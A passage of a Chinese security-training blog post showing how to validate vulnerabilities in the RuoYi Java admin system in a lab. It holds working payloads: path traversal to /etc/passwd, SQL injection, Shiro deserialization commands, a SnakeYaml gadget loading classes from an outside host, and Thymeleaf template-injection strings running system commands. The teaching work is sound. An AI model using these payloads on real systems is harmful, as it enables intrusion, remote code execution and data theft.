+<p><strong><code>StringUtils.substringAfter()</code>方法为取得指定字符串后的字符串</strong>。<code>resource</code>是请求中接收参数的字段。<code>Constants.RESOURCE_PREFIX</code>为设置的常量<code>/profile</code>，主要作用为资源映射路径的前缀。</p>
+<p>③、<code>localPath</code>来自第101行注释为<code>本地资源路径</code>，通过打个端点，我们可以看到<code>localPath: D:/ruoyi/uploadPath</code>，是从<code>src\main\resources\application.yml</code>配置文件中第12行文件路径中获取的。如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/获取全局配置文件路径.jpg" srcset="/img/loading.gif" lazyload alt="获取全局配置文件路径" style="zoom: 50%;" />
+
+<p>④、通过第96行，知道接口路径为<code>/common/download/resource</code>，仅接受GET请求。</p>
+<p>⑤、通过第97行，<code>String resource</code>知道接收参数值的为<code>resource</code>。</p>
+<p>汇总下信息。首先应该知道，处理整个文件流程，是没有任何防护的。</p>
+<p>根据接口路径和接收参数字段组合为<code>/common/download/resource?resource=</code>。</p>
+<p>根据<code>StringUtils.substringAfter()</code>方法为取得指定字符串后的字符串，其中指定的字符串为<code>/profile</code>。也就是取得<code>/profile</code>之后的字符串。</p>
+<p>那么最终，漏洞Payload为<code>http://127.0.0.1/common/download/resource?resource=/profile/../../../../etc/passwd</code>。具体几个<code>../</code>要看实际设置目录的深度。</p>
+<p>下面我们从渗透测试部分进行漏洞验证。</p>
+<h2 id="四、渗透测试漏洞挖掘"><a href="#四、渗透测试漏洞挖掘" class="headerlink" title="四、渗透测试漏洞挖掘"></a>四、渗透测试漏洞挖掘</h2><h3 id="1、SQL注入漏洞验证"><a href="#1、SQL注入漏洞验证" class="headerlink" title="1、SQL注入漏洞验证"></a>1、SQL注入漏洞验证</h3><h4 id="1-1、漏洞简述"><a href="#1-1、漏洞简述" class="headerlink" title="1.1、漏洞简述"></a>1.1、漏洞简述</h4><p>通过代码审计，我们了解到角色相关的功能下展示角色信息列表处存在SQL注入。</p>
+<p>访问WEB页面，发现名叫<code>角色管理</code>的功能。</p>
+<p>当然了，如果我们没有找到功能，也完全可以自己构造数据包。</p>
+<h4 id="1-2、漏洞验证"><a href="#1-2、漏洞验证" class="headerlink" title="1.2、漏洞验证"></a>1.2、漏洞验证</h4><p>①、访问<code>角色管理</code>功能，通过点击下面的各个按钮，并配合BurpSuite抓包，发现<code>搜索</code>功能，会向<code>/system/role/list</code>接口发送数据，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/角色管理-搜索.jpg" srcset="/img/loading.gif" lazyload alt="角色管理-搜索" style="zoom:67%;" />
+
+<p>②、发送到Repeater模块，发现请求Body中没有<code>DataScope</code>，没关系，我们照葫芦画瓢自己添加上，最终如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/添加dataScope字段.jpg" srcset="/img/loading.gif" lazyload alt="添加dataScope字段" style="zoom:67%;" />
+
+<p>③、输入<code>单引号(&#39;)</code>，验证是否存在漏洞，发现返回了报错信息，如下图所示：</p>
+<p><img src="C:/Users/powerful/Desktop/img/sql注入单引号报错.jpg" srcset="/img/loading.gif" lazyload alt="sql注入单引号报错"></p>
+<p>④、直接上SQLMAP，不多费时了，最终结果如下图所示：</p>
+<p><img src="C:/Users/powerful/Desktop/img/sql注入之SQLMAP.jpg" srcset="/img/loading.gif" lazyload alt="sql注入之SQLMAP"></p>
+<h3 id="2、Shiro反序列化漏洞验证"><a href="#2、Shiro反序列化漏洞验证" class="headerlink" title="2、Shiro反序列化漏洞验证"></a>2、Shiro反序列化漏洞验证</h3><h4 id="2-1、漏洞简述"><a href="#2-1、漏洞简述" class="headerlink" title="2.1、漏洞简述"></a>2.1、漏洞简述</h4><p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。</p>
+<p>尽管官方更新了很多版本，但还是没有将反序列化的本身问题解决。后续版本使用了每次生成一个密钥的方法来解决该漏洞。但是由于开源系统，或者教学代码范例常将弱密钥硬编码等原因，因此导致很多开发人员疏忽，经验不足而导致该问题的产生。</p>
+<p>通过查看pom.xml文件我们确定了Shiro版本为<code>1.4.2</code>。<code>Shiro 1.4.2</code>版本对于Shiro反序列化来说是个分水岭。由于CVE-2019-12422漏洞的出现，也就是Shiro Padding Oracle Attack漏洞。Shiro在1.4.2版本开始，由<code>AES-CBC</code>加密模式改为了<code>AES-GCM</code>。所以我们在做漏洞验证时，要将payload改成<code>AES-GCM</code>加密模式。</p>
+<h4 id="2-2、漏洞验证"><a href="#2-2、漏洞验证" class="headerlink" title="2.2、漏洞验证"></a>2.2、漏洞验证</h4><p>在黑盒测试中，我们可以在Cookie中添加<code>rememberMe=123</code>，如果响应<code>Set-Cookie</code>头返回<code>rememberMe=deleteMe</code>，那么就可可以确定该系统使用了Shiro框架。如下图所示：</p>
+<p><img src="C:/Users/powerful/Desktop/img/rememberme_deleteme.JPG" srcset="/img/loading.gif" lazyload alt="rememberme_deleteme"></p>
+<p>下面我们使用攻击脚本进行漏洞验证，该脚本在已添加至附件中。</p>
+<p>:warning:该脚本基于Python3，在命令行中执行<code>pip3 install pycryptodome</code>，安装所需依赖包。</p>
+<p>①、探测常见的弱密钥，执行命令如下：</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">python3 shiro-exploit.py<span class="hljs-built_in"> check </span>-u http://xxx/ 可以使用 -v来指定版本，默认是两个都探测，在黑盒测试中不必指定版本。<br></code></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/powerful/Desktop/img/探测弱密钥.jpg" srcset="/img/loading.gif" lazyload alt="探测弱密钥"></p>
+<p>②、攻击AES-GCM加密模式的Shiro：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python3 shiro-exploit.py echo -g CommonsCollectionsK1 -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">12.157</span>:<span class="hljs-number">9999</span><span class="hljs-regexp">/ -v 2 -k fCq+/</span>xW488hMTCD+cmJ3aQ== -c whoami<br></code></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/powerful/Desktop/img/shiro执行命令.jpg" srcset="/img/loading.gif" lazyload alt="shiro执行命令"></p>
+<p>剩下的自己尽情发挥。</p>
+<p>详细使用说明及教程，参考项目原地址：<code>https://github.com/Ares-X/shiro-exploit</code></p>
+<h3 id="3、Fastjson漏洞验证验证"><a href="#3、Fastjson漏洞验证验证" class="headerlink" title="3、Fastjson漏洞验证验证"></a>3、Fastjson漏洞验证验证</h3><h4 id="3-1、漏洞简述"><a href="#3-1、漏洞简述" class="headerlink" title="3.1、漏洞简述"></a>3.1、漏洞简述</h4><p>在代码审计处发现该项目使用了存在漏洞版本的Fastjson。在代码审计处，我们确定了功能点为代码生成处的<code>修改保存生成业务</code>，该路径部分为<code>edit</code>，完整路径为<code>/tool/gen/edit</code>，请求方法为POST，并且主要关注<code>params</code>这个字段。</p>
+<h4 id="3-2、漏洞验证"><a href="#3-2、漏洞验证" class="headerlink" title="3.2、漏洞验证"></a>3.2、漏洞验证</h4><p>进入若依管理后台。访问<code>系统工具-代码生成-导入</code>，先随便导入一个表，如下图所示：</p>
+<p><img src="C:/Users/powerful/Desktop/img/代码生成功能导入一个表.jpg" srcset="/img/loading.gif" lazyload alt="代码生成功能导入一个表"></p>
+<p>:warning:注意：访问导入功能报错，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/导入功能报错.jpg" srcset="/img/loading.gif" lazyload alt="导入功能报错" style="zoom:50%;" />
+
+<p>这是因为是mysql自带的表information_schema.tables，与若依系统的表进行了关联查询。</p>
+<p>而information_schema用的是utf8_general_ci编码排序，若依建数据库时，默认选了utf8_unicode_ci。</p>
+<p>需要我们在创建若依数据库时将编码格式改为utf8_general_ci，如下图所示：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> ry<br><span class="hljs-keyword">default</span> <span class="hljs-type">character</span> <span class="hljs-keyword">set</span> utf8<br><span class="hljs-keyword">default</span> <span class="hljs-keyword">collate</span> utf8_general_ci;<br></code></pre></td></tr></table></figure>
+
+<img src="C:/Users/powerful/Desktop/img/设置若依数据库编码格式.jpg" srcset="/img/loading.gif" lazyload alt="设置若依数据库编码格式" style="zoom: 67%;" />
+
+<p>一个小插曲，继续漏洞验证……</p>
+<h3 id="4、任意文件读取-x2F-下载漏洞验证"><a href="#4、任意文件读取-x2F-下载漏洞验证" class="headerlink" title="4、任意文件读取&#x2F;下载漏洞验证"></a>4、任意文件读取&#x2F;下载漏洞验证</h3><h4 id="4-1、漏洞简述"><a href="#4-1、漏洞简述" class="headerlink" title="4.1、漏洞简述"></a>4.1、漏洞简述</h4><p>在<code>第三章 3.4 任意文件读取/下载漏洞代码审计 </code>处，通过代码审计角度发现本系统存在任意文件读取&#x2F;下载漏洞。现在，我们从渗透测试角度进行验证。</p>
+<h4 id="4-2、漏洞验证"><a href="#4-2、漏洞验证" class="headerlink" title="4.2、漏洞验证"></a>4.2、漏洞验证</h4><p>我们使用的是Linux环境启动的本项目。具体启动部署请跳跃到<code>第二章 3、Linux环境的项目部署流程 </code>处。</p>
+<p>务必请注意以下两项：</p>
+<p>①、在<code>RuoYi-v4.2\ruoyi-admin\src\main\resources\application.yml</code>配置文件中修改linux配置路径为<code>/home/ruoyi/uploadPath</code>（<strong>未在Linux部署时说明，此时应注意</strong>），如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/linux配置文件路径.jpg" srcset="/img/loading.gif" lazyload alt="linux配置文件路径" style="zoom: 50%;" />
+
+<p>②、在Linux系统的<code>/home</code>目录下创建<code>/ruoyi/uploadPath</code>。</p>
+<p>启动项目，开始验证。</p>
+<p>①、登录后台，此时用Burp随便抓个包。</p>
+<p>②、使用代码审计构造出的payload进行构造请求，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/渗透任意文件读取构造请求.jpg" srcset="/img/loading.gif" lazyload alt="渗透任意文件读取构造请求" style="zoom:67%;" />
+
+<p>③、点击发送数据包，即可看到<code>/etc/passwd</code>文件内容，如下图所示：</p>
+<p><img src="C:/Users/powerful/Desktop/img/任意文件读取内容.jpg" srcset="/img/loading.gif" lazyload alt="任意文件读取内容"></p>
+<h3 id="5、定时任务处漏洞验证"><a href="#5、定时任务处漏洞验证" class="headerlink" title="5、定时任务处漏洞验证"></a>5、定时任务处漏洞验证</h3><h4 id="5-1、漏洞简述"><a href="#5-1、漏洞简述" class="headerlink" title="5.1、漏洞简述"></a>5.1、漏洞简述</h4><p>在对定时任务代码审计时发现该功能存在漏洞。在<code>添加任务-&gt;调用目标字符串</code>处可操作class类，通过代码审计发现使用的反射方式，也就是说目标class类存在漏洞的话即可利用反射触发RCE漏洞。</p>
+<h4 id="5-2、漏洞验证"><a href="#5-2、漏洞验证" class="headerlink" title="5.2、漏洞验证"></a>5.2、漏洞验证</h4><p>我们使用的是Linux环境启动的本项目。具体启动部署请跳转到<code>第二章 3、Linux环境的项目部署流程 </code>。</p>
+<p>在代码审计处，我们知道如果是调用class类，最终执行为<code>Object bean = Class.forName(beanName).newInstance();</code>。</p>
+<p>问题来了，如果此处想要成功实例化并且RCE的话，那么必须满足几个条件：</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-number">1</span>、类的构造方法为<span class="hljs-keyword">Public</span><br><span class="hljs-number">2</span>、类的构造方法无参<br><span class="hljs-number">3</span>、调用目标字符串的参数为：支持字符串，布尔类型，长整型，浮点型，整型<br><span class="hljs-number">4</span>、调用目标方法除了为<span class="hljs-keyword">Public</span>，无参，还需要具有执行代码/命令的能力<br></code></pre></td></tr></table></figure>
+
+<p>有的朋友一开始会想到调用<code>java.lang.Runtime.getRuntime().exec(&quot;&quot;)</code>。但经过上面条件的梳理，发现该类不满足条件，因为他的构造方法是private。</p>
+<p>不知道大家还记得<code>SnakeYaml组件漏洞代码审计</code>不。</p>
+<p>在组件检测时发现了本项目使用了<code>SnakeYaml</code>。经过学习我们知道，该组件只要可以控制<code>yaml.load()</code>即可触发反序列漏洞。</p>
+<p>经过探索学习，<code>SnakeYaml的yaml.load()</code>是满足以上条件的，具体操作如下。</p>
+<p><strong>5.2.1、基础验证</strong></p>
+<p>①、先登录DNSlog平台，获取一个DNSlog地址。</p>
+<p>②、然后进入后台，访问<code>系统监控-定时任务</code>功能，点击新增，在目标字符串下添加如下内容（即攻击payload）：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">org.yaml.snakeyaml.Yaml.<span class="hljs-keyword">load</span>(&#x27;!<span class="hljs-title">!javax.script.ScriptEngineManager</span> [!<span class="hljs-title">!java.net.URLClassLoader</span> [[!<span class="hljs-title">!java.net.URL</span> [<span class="hljs-string">&quot;ftp://此处填入DNSlog地址&quot;</span>]]]]&#x27;)<br></code></pre></td></tr></table></figure>
+
+<img src="C:/Users/powerful/Desktop/img/调用目标字符串yaml.jpg" srcset="/img/loading.gif" lazyload alt="调用目标字符串yaml" style="zoom:50%;" />
+
+<p>③、点击确定后，在该页面点击<code>更多操作-立即执行</code>后，即可在DNSlog处看到探测信息，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/dnslog探测结果.jpg" srcset="/img/loading.gif" lazyload alt="dnslog探测结果" style="zoom:50%;" />
+
+<p><strong>5.2.2、利用工具进一步攻击</strong></p>
+<p>推荐一款若依一键利用工具。项目地址：<code>https://github.com/passer-W/Ruoyi-All</code></p>
+<p>根据该工具介绍如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/ruoyiall工具介绍.jpg" srcset="/img/loading.gif" lazyload alt="ruoyiall工具介绍" style="zoom: 67%;" />
+
+<p>我将该工具与本篇课程一起打包分享了出来，纯官方下载，放心使用。</p>
+<p>①、打开该工具后，填写一些配置，其中包括目标URL和Cookie，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/ruoyiall填写信息.jpg" srcset="/img/loading.gif" lazyload alt="ruoyiall填写信息" style="zoom: 67%;" />
+
+<p>②、然后点击确定，即开始漏洞检测。存在漏洞提示如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/ruoyiall检测出漏洞.jpg" srcset="/img/loading.gif" lazyload alt="ruoyiall检测出漏洞" style="zoom:67%;" />
+
+<p>:warning:<strong>注意：</strong>关于该漏洞进一步利用留个作业，大家务必动手研究一下，并形成学习文档提交到第五期作业处。不要仅仅以为自己看了就学会了。</p>
+<h3 id="6、Thymeleaf模板注入漏洞验证"><a href="#6、Thymeleaf模板注入漏洞验证" class="headerlink" title="6、Thymeleaf模板注入漏洞验证"></a>6、Thymeleaf模板注入漏洞验证</h3><h4 id="6-1、漏洞简述"><a href="#6-1、漏洞简述" class="headerlink" title="6.1、漏洞简述"></a>6.1、漏洞简述</h4><p>在代码审计处，我们发现<code>若依v4.7.1</code>存在Thymeleaf模板注入漏洞，并且存在return内容可控的漏洞点，我们通过渗透测试角度进行漏洞验证。</p>
+<h4 id="6-2、漏洞验证"><a href="#6-2、漏洞验证" class="headerlink" title="6.2、漏洞验证"></a>6.2、漏洞验证</h4><p>Thymeleaf模板注入payload举例：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">return内容可控：<br>__$&#123;new java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Scanner</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Runtime)<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;whoami&quot;</span>)<span class="hljs-selector-class">.getInputStream</span>())<span class="hljs-selector-class">.next</span>()&#125;__::<span class="hljs-selector-class">.x</span><br><br>URL路径可控：<br>__$&#123;<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Runtime)<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;touch test&quot;</span>)&#125;__::<span class="hljs-selector-class">.x</span><br><br></code></pre></td></tr></table></figure>
+
+<p>本次漏洞验证我在Windows环境下进行的。</p>
+<p>:warning:<strong>注意</strong>：<code>若依v4.7.1</code>搭建部署与<code>若依v4.2</code>相同，数据库导入务必使用<code>sql</code>目录下的<code>ry_20210924.sql</code>和<code>quartz.sql</code>。先导入<code>ry_20210924.sql</code>。</p>
+<p>我们以<code>getKeys</code>接口为例，该漏洞点为<code>return内容可控</code>，具体漏洞验证如下。</p>
+<p>①、正常启动项目，进入后台。我们发现在<code>系统监控</code>下有个<code>缓存监控</code>的功能，和代码审计发现的<code>CacheControlle</code>代码文件中功能注释一样。初步确定两者相同。</p>
+<p>②、访问缓存监控功能。进入后，分别点击<code>缓存列表</code>和<code>键名列表</code>旁的刷新按钮，会分别想<code>getNames</code>，<code>getKeys</code>接口发送数据。如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/缓存监控getKeys.jpg" srcset="/img/loading.gif" lazyload alt="缓存监控getKeys" style="zoom: 50%;" />
+
+<p>③、将数据包发送到Repeater模块，在<code>fragment</code>参数后构造攻击payload为<code>__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)&#125;__::.x</code>，对paylod进行URL编码后。发送数据包。响应报错，而且并没有弹出来计算器。如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/getkeys报错.jpg" srcset="/img/loading.gif" lazyload alt="getkeys报错" style="zoom: 50%;" />
+
+<p>找了半天原因，发现<code>若依v4.7.1</code>版本使用的是<code>Thymeleaf3.0.12</code>版本。</p>
+<p>官方在这个版本进行了一些限制，比如使用new实例化，静态方法调用都被限制了。还有其他一些限制，详细可看<code>https://github.com/thymeleaf/thymeleaf/issues/809</code>。下图为谷歌机翻，大致可以看一下。</p>
+<p><img src="file://F:\3%20-%20%E4%BA%8B%E4%B8%9A%E4%B8%BA%E4%B8%BBGoUp@\2%20-%20%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92GoUp@%EF%BC%88%E5%A5%8B%E5%8A%9B%E6%9B%B4%E6%96%B0%E4%B8%AD...%EF%BC%893%E3%80%81%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92%E4%B9%8BWEB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E6%88%98%EF%BC%88%E6%9B%B4%E6%96%B0ing%EF%BC%895%E3%80%81%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92%E4%B9%8B50%E5%A5%97JavaWeb%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E6%88%98_%E7%AC%AC%E4%BA%94%E5%A5%97_%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E3%80%90%E6%95%99%E7%A8%8B%E6%96%87%E7%AB%A0%E3%80%91%E7%AC%AC%E4%BA%94%E5%A5%97_%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F\img\thymeleaf3012%E9%99%90%E5%88%B6.jpg?lastModify=1652148836" srcset="/img/loading.gif" lazyload alt="thymeleaf3012限制"></p>
+<p>因此，我们刚开始用的Payload是被限制了。</p>
+<p>经过一顿操作猛如虎，其实谷歌就能有。</p>
+<p>我们将Payload改造一下，如<code>$&#123;T    (java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)&#125;</code>。在T和(之间多加几个空格即可。</p>
+<p>对Payload进行URL编码后，放入<code>fragment</code>参数中，可以看到弹出了计算器，如下图所示：</p>
+<img src="C:/Users/powerful/Desktop/img/thymeleaf弹计算器.jpg" srcset="/img/loading.gif" lazyload alt="thymeleaf弹计算器" style="zoom: 50%;" />
+
+
+
+<p>至此，漏洞验证部分结束。</p>
+<p>希望大家在这基础上，进一步学习Thymeleaf模板注入漏洞。直接推荐一篇文章：<code>https://xz.aliyun.com/t/9826</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>JavaWeb代码审计实战之若依管理系统，细节满满不得不好好学的一个系统</div>
+      <div>http://example.com/2022/08/22/JavaWeb代码审计实战之若依管理系统，细节满满不得不好好学的一个系统/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Power7089</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年8月22日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/08/22/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98%E4%B9%8B%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E8%AF%A6%E8%A7%A3%E7%89%88%E6%9C%AC/" title="JavaWeb代码审计实战之反射机制基础-代码详解版本">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">JavaWeb代码审计实战之反射机制基础-代码详解版本</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/08/22/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98%E4%B9%8B%E6%9F%90RBAC%E7%B3%BB%E7%BB%9F%EF%BC%8C%E9%9D%9E%E5%B8%B8%E9%80%82%E5%90%88%E5%B0%8F%E7%99%BD%E5%85%A5%E9%97%A8%E7%BB%83%E4%B9%A0%E7%9A%84%E7%B3%BB%E7%BB%9F/" title="JavaWeb代码审计实战之某RBAC系统，非常适合小白入门练习的系统">
+                        <span class="hidden-mobile">JavaWeb代码审计实战之某RBAC系统，非常适合小白入门练习的系统</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       欢迎知识星球搜索【炼石计划@Java代码审计】【炼石计划@PHP代码审计】【炼石计划@渗透攻防宇宙】 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
